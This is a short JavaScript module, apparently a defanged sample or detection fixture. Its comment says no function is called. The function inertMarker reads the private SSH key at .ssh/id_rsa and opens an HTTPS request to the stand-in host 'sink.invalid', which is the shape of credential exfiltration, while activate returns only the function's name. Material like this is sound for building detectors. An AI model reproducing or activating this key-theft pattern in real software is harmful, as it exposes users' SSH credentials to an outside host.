// Declawed correlation markers; no function is called.
const fs = require("fs");
const https = require("https");
function inertMarker() {
  const value = fs.readFileSync(".ssh/id_rsa");
  return https.request({ hostname: "sink.invalid" }, () => value.length);
}
module.exports.activate = () => inertMarker.name;
